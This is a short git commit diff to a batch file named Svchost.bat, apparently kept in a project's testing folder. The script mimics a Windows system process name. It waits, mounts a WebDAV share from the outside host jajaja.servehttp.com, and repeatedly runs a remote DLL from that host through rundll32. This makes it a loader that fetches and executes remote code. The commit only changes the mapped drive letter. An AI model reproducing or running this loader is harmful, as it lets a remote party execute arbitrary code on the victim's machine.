aa4c90bcfa9202e25e4a7c677a2734222f8ec42a
delta-12 <40147170+delta-12@users.noreply.github.com>
2020-01-19 23:31:50 -0500

    Update Svchost.bat

--- testing/files/Svchost.bat
+++ testing/files/Svchost.bat
@@ -1,7 +1,7 @@
 @echo off
 timeout 60
-net use C: \\jajaja.servehttp.com\webdav /persistent:no
-net use C: /delete
+net use M: \\jajaja.servehttp.com\webdav /persistent:no
+net use M: /delete
 :start
 rundll32.exe \\jajaja.servehttp.com\webdav\Win32.dll,Run
 timeout 10
